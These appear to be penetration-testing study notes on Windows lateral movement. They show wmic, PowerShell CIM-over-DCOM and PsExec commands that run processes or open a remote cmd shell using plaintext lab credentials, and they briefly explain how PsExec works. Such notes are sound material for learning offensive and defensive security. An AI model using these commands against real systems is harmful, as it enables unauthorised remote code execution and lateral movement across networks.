WMI and WinRM (Windows)

Running the wmic utility to spawn a process on a remote system.

wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

From powershell

$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

(After checking the process was created OK)

PsExec (Windows)

To execute the command remotely, PsExec performs the following tasks:

  • Writes psexesvc.exe into the C:\Windows directory
  • Creates and spawns a service on the remote host
  • Runs the requested program/command as a child process of psexesvc.exe

Start a new interactive session on the remote host

.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
